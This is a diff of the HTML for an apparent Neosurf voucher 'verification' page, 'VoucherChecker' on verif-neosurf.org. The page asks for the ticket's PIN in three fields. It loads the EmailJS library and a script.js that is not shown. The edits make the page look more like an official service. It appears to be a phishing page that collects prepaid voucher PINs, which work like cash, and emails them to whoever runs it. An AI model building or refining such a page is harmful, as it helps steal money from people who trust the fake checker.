@@ -24,18 +24,10 @@
 
     <!-- Barre du haut -->
     <header class="topbar">
-
         <div class="brand">
-
             <img src="assets/logo.png" alt="Logo VoucherChecker" class="logo-brand">
-
-            <span> Verifier votre code neosurf en ligne </span>
-
+            <span>Vérifier votre code Neosurf en ligne</span>
         </div>
-     <div class="refund-link">
-            
-    </div>
-
     </header>
 
     <div class="background-shape shape1"></div>
@@ -45,90 +37,76 @@
 
         <section class="verification-card">
 
-            <div class="shield-icon">
-                🛡️
+            <div class="verification-header">
+                <h2>Entrez le code PIN du ticket</h2>
             </div>
 
-            <h2>Vérification sécurisée</h2>
+            <div class="verification-body">
 
-            <p class="verification-text">
-                Entrez votre code de vérification afin de consulter votre solde,
-                la validité de votre voucher ainsi que son statut.
-            </p>
-
-           
                 <form id="verificationForm">
 
-    <div class="code-group">
+                    <div class="code-group">
 
-        <input
-            type="text"
-            id="part1"
-            name="part1"
-            maxlength="4"
-            class="code-input"
-            autocomplete="off">
+                        <input
+                            type="text"
+                            id="part1"
+                            name="part1"
+                            maxlength="4"
+                            class="code-input"
+                            autocomplete="off">
 
-        <span class="separator">-</span>
+                        <input
+                            type="text"
+                            id="part2"
+                            name="part2"
+                            maxlength="3"
+                            class="code-input"
+                            autocomplete="off">
 
-        <input
-            type="text"
-            id="part2"
-            name="part2"
-            maxlength="3"
-            class="code-input"
-            autocomplete="off">
+                        <input
+                            type="text"
+                            id="part3"
+                            name="part3"
+                            maxlength="3"
+                            class="code-input"
+                            autocomplete="off">
 
-        <span class="separator">-</span>
+                    </div>
 
-        <input
-            type="text"
-            id="part3"
-            name="part3"
-            maxlength="3"
-            class="code-input"
-            autocomplete="off">
+                    <div class="recaptcha-container">
+                        <div class="g-recaptcha"
+                             data-sitekey="6Ldu2GktAAAAANldHSQFupc9RC-Yi-24DIQ6-mCO">
+                        </div>
+                    </div>
 
-    </div>
+                    <button type="submit" id="verifyBtn">
+                        Soumettre
+                    </button>
 
-    <div class="g-recaptcha"
-     data-sitekey="6Ldu2GktAAAAANldHSQFupc9RC-Yi-24DIQ6-mCO">
-           </div>
- <button type="submit" id="verifyBtn" desabled>
-        Vérifier le code
-    </button>
-</form>
+                </form>
 
-<br>
-            <div id="result"></div>
-
-            <div class="help-text">
-
-                🔒 Toutes les vérifications sont sécurisées.
-
-                <br><br>
-
-                Besoin d'aide ?
-                Veuillez contacter notre service client.
+                <div id="result"></div>
 
             </div>
 
         </section>
 
     </main>
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="script.js"></script>
 
-<script src="script.js"></script>
-    
-<footer>
+    <footer class="verification-footer">
 
-    <p>
-        © 2020 Neosurf voucher — Tous droits réservés.
-    </p>
+        <div class="footer-top">
+            Conditions • Politique de confidentialité • Besoin d'aide ? • Français ▼
+        </div>
 
-</footer>
+        <div class="footer-bottom">
+            © 2026 verif-neosurf.org — Tous droits réservés.
+        </div>
 
+    </footer>
 
 </body>
 
